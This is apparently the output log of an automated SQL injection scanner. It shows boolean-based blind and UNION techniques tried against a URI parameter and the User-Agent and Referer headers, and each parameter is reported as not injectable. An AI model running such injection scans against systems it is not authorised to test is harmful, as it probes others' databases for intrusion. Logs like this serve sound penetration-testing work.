2025-09-26 18:59:26,120 - INFO - [18:59:26] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
2025-09-26 18:59:26,139 - INFO - [18:59:26] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
2025-09-26 18:59:26,165 - INFO - [18:59:26] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
2025-09-26 18:59:26,183 - INFO - [18:59:26] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
2025-09-26 18:59:26,205 - INFO - [18:59:26] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
2025-09-26 18:59:26,227 - INFO - [18:59:26] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
2025-09-26 18:59:26,254 - INFO - [18:59:26] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
2025-09-26 18:59:26,286 - INFO - [18:59:26] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
2025-09-26 18:59:26,316 - INFO - [18:59:26] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
2025-09-26 18:59:26,342 - INFO - [18:59:26] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
2025-09-26 18:59:26,369 - INFO - [18:59:26] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
2025-09-26 18:59:26,394 - INFO - [18:59:26] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
2025-09-26 18:59:26,420 - INFO - [18:59:26] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
2025-09-26 18:59:26,457 - INFO - [18:59:26] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
2025-09-26 18:59:26,483 - INFO - [18:59:26] [INFO] testing 'Informix boolean-based blind - Parameter replace'
2025-09-26 18:59:26,491 - INFO - [18:59:26] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
2025-09-26 18:59:26,520 - INFO - [18:59:26] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
2025-09-26 18:59:26,541 - INFO - [18:59:26] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
2025-09-26 18:59:26,560 - INFO - [18:59:26] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 18:59:26,590 - INFO - [18:59:26] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 18:59:26,604 - INFO - [18:59:26] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 18:59:26,629 - INFO - [18:59:26] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 18:59:26,646 - INFO - [18:59:26] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:59:26,697 - INFO - [18:59:26] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:59:26,746 - INFO - [18:59:26] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:59:26,750 - INFO - [18:59:26] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:59:26,750 - INFO - [18:59:26] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:59:26,778 - INFO - [18:59:26] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:59:26,815 - INFO - [18:59:26] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
2025-09-26 18:59:26,854 - INFO - [18:59:26] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
2025-09-26 18:59:26,888 - INFO - [18:59:26] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:59:26,938 - INFO - [18:59:26] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:59:26,975 - INFO - [18:59:26] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:59:27,006 - INFO - [18:59:27] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:59:27,045 - INFO - [18:59:27] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:59:27,075 - INFO - [18:59:27] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:59:27,117 - INFO - [18:59:27] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:59:27,162 - INFO - [18:59:27] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
2025-09-26 18:59:27,199 - INFO - [18:59:27] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:59:27,239 - INFO - [18:59:27] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 18:59:27,918 - INFO - [18:59:27] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:59:28,436 - INFO - [18:59:28] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:59:28,469 - INFO - [18:59:28] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
2025-09-26 18:59:28,948 - INFO - [18:59:28] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
2025-09-26 18:59:29,463 - INFO - [18:59:29] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
2025-09-26 18:59:29,988 - INFO - [18:59:29] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
2025-09-26 18:59:30,521 - INFO - [18:59:30] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
2025-09-26 18:59:31,019 - INFO - [18:59:31] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
2025-09-26 18:59:31,426 - INFO - [18:59:31] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
2025-09-26 18:59:31,980 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 18:59:31,980 - INFO - [18:59:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:59:32,379 - INFO - [18:59:32] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 18:59:32,837 - INFO - [18:59:32] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:59:33,263 - INFO - [18:59:33] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
2025-09-26 18:59:33,592 - INFO - [18:59:33] [WARNING] URI parameter '#1*' does not seem to be injectable
2025-09-26 18:59:33,592 - INFO - other non-custom parameters found. Do you want to process them too? [Y/n/q] Y
2025-09-26 18:59:33,592 - INFO - [18:59:33] [INFO] testing if parameter 'User-Agent' is dynamic
2025-09-26 18:59:33,602 - INFO - [18:59:33] [WARNING] parameter 'User-Agent' does not appear to be dynamic
2025-09-26 18:59:33,612 - INFO - [18:59:33] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
2025-09-26 18:59:33,612 - INFO - [18:59:33] [INFO] testing for SQL injection on parameter 'User-Agent'
2025-09-26 18:59:33,685 - INFO - [18:59:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:59:34,084 - INFO - [18:59:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:59:34,654 - INFO - [18:59:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 18:59:35,030 - INFO - [18:59:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:59:35,432 - INFO - [18:59:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:59:35,825 - INFO - [18:59:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:59:35,904 - INFO - [18:59:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:59:36,030 - INFO - [18:59:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 18:59:36,112 - INFO - [18:59:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:59:36,270 - INFO - [18:59:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:59:36,533 - INFO - [18:59:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 18:59:36,725 - INFO - [18:59:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:59:36,921 - INFO - [18:59:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:59:37,202 - INFO - [18:59:37] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 18:59:37,600 - INFO - [18:59:37] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:59:37,950 - INFO - [18:59:37] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:59:38,427 - INFO - [18:59:38] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:59:38,721 - INFO - [18:59:38] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:59:39,339 - INFO - [18:59:39] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:59:39,671 - INFO - [18:59:39] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:59:40,238 - INFO - [18:59:40] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:59:40,545 - INFO - [18:59:40] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:59:41,076 - INFO - [18:59:41] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:59:41,398 - INFO - [18:59:41] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:59:41,895 - INFO - [18:59:41] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:59:42,265 - INFO - [18:59:42] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:59:42,760 - INFO - [18:59:42] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:59:42,760 - INFO - [18:59:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
2025-09-26 18:59:42,782 - INFO - [18:59:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
2025-09-26 18:59:42,789 - INFO - [18:59:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
2025-09-26 18:59:42,800 - INFO - [18:59:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
2025-09-26 18:59:42,800 - INFO - [18:59:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
2025-09-26 18:59:42,818 - INFO - [18:59:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
2025-09-26 18:59:42,828 - INFO - [18:59:42] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
2025-09-26 18:59:42,828 - INFO - [18:59:42] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
2025-09-26 18:59:42,850 - INFO - [18:59:42] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
2025-09-26 18:59:42,860 - INFO - [18:59:42] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
2025-09-26 18:59:42,876 - INFO - [18:59:42] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
2025-09-26 18:59:42,890 - INFO - [18:59:42] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
2025-09-26 18:59:42,903 - INFO - [18:59:42] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
2025-09-26 18:59:42,906 - INFO - [18:59:42] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
2025-09-26 18:59:42,916 - INFO - [18:59:42] [INFO] testing 'Informix boolean-based blind - Parameter replace'
2025-09-26 18:59:42,928 - INFO - [18:59:42] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
2025-09-26 18:59:42,928 - INFO - [18:59:42] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
2025-09-26 18:59:42,949 - INFO - [18:59:42] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
2025-09-26 18:59:42,959 - INFO - [18:59:42] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 18:59:42,963 - INFO - [18:59:42] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 18:59:42,982 - INFO - [18:59:42] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 18:59:42,988 - INFO - [18:59:42] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 18:59:43,001 - INFO - [18:59:43] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:59:43,022 - INFO - [18:59:43] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:59:43,043 - INFO - [18:59:43] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:59:43,043 - INFO - [18:59:43] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:59:43,043 - INFO - [18:59:43] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:59:43,070 - INFO - [18:59:43] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:59:43,091 - INFO - [18:59:43] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
2025-09-26 18:59:43,109 - INFO - [18:59:43] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
2025-09-26 18:59:43,132 - INFO - [18:59:43] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:59:43,155 - INFO - [18:59:43] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:59:43,169 - INFO - [18:59:43] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:59:43,193 - INFO - [18:59:43] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:59:43,210 - INFO - [18:59:43] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:59:43,243 - INFO - [18:59:43] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:59:43,273 - INFO - [18:59:43] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:59:43,290 - INFO - [18:59:43] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
2025-09-26 18:59:43,319 - INFO - [18:59:43] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:59:43,358 - INFO - [18:59:43] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 18:59:43,673 - INFO - [18:59:43] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:59:43,895 - INFO - [18:59:43] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:59:43,895 - INFO - [18:59:43] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
2025-09-26 18:59:44,105 - INFO - [18:59:44] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
2025-09-26 18:59:44,367 - INFO - [18:59:44] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
2025-09-26 18:59:44,597 - INFO - [18:59:44] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
2025-09-26 18:59:44,812 - INFO - [18:59:44] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
2025-09-26 18:59:45,006 - INFO - [18:59:45] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
2025-09-26 18:59:45,237 - INFO - [18:59:45] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
2025-09-26 18:59:45,479 - INFO - [18:59:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:59:46,112 - INFO - [18:59:46] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 18:59:46,737 - INFO - [18:59:46] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:59:47,274 - INFO - [18:59:47] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
2025-09-26 18:59:47,836 - INFO - [18:59:47] [WARNING] parameter 'User-Agent' does not seem to be injectable
2025-09-26 18:59:47,836 - INFO - [18:59:47] [INFO] testing if parameter 'Referer' is dynamic
2025-09-26 18:59:47,852 - INFO - [18:59:47] [WARNING] parameter 'Referer' does not appear to be dynamic
2025-09-26 18:59:47,863 - INFO - [18:59:47] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
2025-09-26 18:59:47,874 - INFO - [18:59:47] [INFO] testing for SQL injection on parameter 'Referer'
2025-09-26 18:59:47,937 - INFO - [18:59:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:59:48,360 - INFO - [18:59:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:59:49,030 - INFO - [18:59:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 18:59:49,390 - INFO - [18:59:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:59:49,701 - INFO - [18:59:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:59:50,078 - INFO - [18:59:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:59:50,158 - INFO - [18:59:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:59:50,284 - INFO - [18:59:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 18:59:50,358 - INFO - [18:59:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:59:50,518 - INFO - [18:59:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:59:50,797 - INFO - [18:59:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 18:59:51,001 - INFO - [18:59:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:59:51,212 - INFO - [18:59:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:59:51,522 - INFO - [18:59:51] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 18:59:51,842 - INFO - [18:59:51] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:59:52,150 - INFO - [18:59:52] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:59:52,631 - INFO - [18:59:52] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:59:52,953 - INFO - [18:59:52] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:59:53,526 - INFO - [18:59:53] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:59:53,839 - INFO - [18:59:53] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:59:54,499 - INFO - [18:59:54] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:59:54,884 - INFO - [18:59:54] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:59:55,461 - INFO - [18:59:55] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:59:55,790 - INFO - [18:59:55] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:59:56,351 - INFO - [18:59:56] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:59:56,647 - INFO - [18:59:56] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:59:57,160 - INFO - [18:59:57] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:59:57,177 - INFO - [18:59:57] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
2025-09-26 18:59:57,195 - INFO - [18:59:57] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
2025-09-26 18:59:57,200 - INFO - [18:59:57] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
2025-09-26 18:59:57,227 - INFO - [18:59:57] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
2025-09-26 18:59:57,238 - INFO - [18:59:57] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
2025-09-26 18:59:57,255 - INFO - [18:59:57] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
2025-09-26 18:59:57,266 - INFO - [18:59:57] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
2025-09-26 18:59:57,272 - INFO - [18:59:57] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
2025-09-26 18:59:57,272 - INFO - [18:59:57] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
2025-09-26 18:59:57,293 - INFO - [18:59:57] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
2025-09-26 18:59:57,304 - INFO - [18:59:57] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
2025-09-26 18:59:57,315 - INFO - [18:59:57] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
2025-09-26 18:59:57,329 - INFO - [18:59:57] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
2025-09-26 18:59:57,329 - INFO - [18:59:57] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
2025-09-26 18:59:57,338 - INFO - [18:59:57] [INFO] testing 'Informix boolean-based blind - Parameter replace'
2025-09-26 18:59:57,363 - INFO - [18:59:57] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
2025-09-26 18:59:57,370 - INFO - [18:59:57] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
2025-09-26 18:59:57,379 - INFO - [18:59:57] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
2025-09-26 18:59:57,388 - INFO - [18:59:57] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 18:59:57,388 - INFO - [18:59:57] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 18:59:57,421 - INFO - [18:59:57] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 18:59:57,433 - INFO - [18:59:57] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 18:59:57,448 - INFO - [18:59:57] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:59:57,468 - INFO - [18:59:57] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:59:57,485 - INFO - [18:59:57] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:59:57,485 - INFO - [18:59:57] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:59:57,485 - INFO - [18:59:57] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:59:57,505 - INFO - [18:59:57] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:59:57,529 - INFO - [18:59:57] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
2025-09-26 18:59:57,554 - INFO - [18:59:57] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
2025-09-26 18:59:57,580 - INFO - [18:59:57] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:59:57,594 - INFO - [18:59:57] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:59:57,604 - INFO - [18:59:57] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:59:57,644 - INFO - [18:59:57] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:59:57,671 - INFO - [18:59:57] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:59:57,698 - INFO - [18:59:57] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:59:57,724 - INFO - [18:59:57] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:59:57,754 - INFO - [18:59:57] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
2025-09-26 18:59:57,782 - INFO - [18:59:57] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:59:57,811 - INFO - [18:59:57] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 18:59:58,126 - INFO - [18:59:58] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:59:58,344 - INFO - [18:59:58] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:59:58,361 - INFO - [18:59:58] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
2025-09-26 18:59:58,588 - INFO - [18:59:58] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
2025-09-26 18:59:58,820 - INFO - [18:59:58] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
2025-09-26 18:59:59,054 - INFO - [18:59:59] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
2025-09-26 18:59:59,292 - INFO - [18:59:59] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
2025-09-26 18:59:59,546 - INFO - [18:59:59] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
2025-09-26 18:59:59,783 - INFO - [18:59:59] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
2025-09-26 19:00:00,088 - INFO - [19:00:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:00:00,681 - INFO - [19:00:00] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 19:00:01,333 - INFO - [19:00:01] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:00:02,129 - INFO - [19:00:02] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
2025-09-26 19:00:02,714 - INFO - [19:00:02] [WARNING] parameter 'Referer' does not seem to be injectable
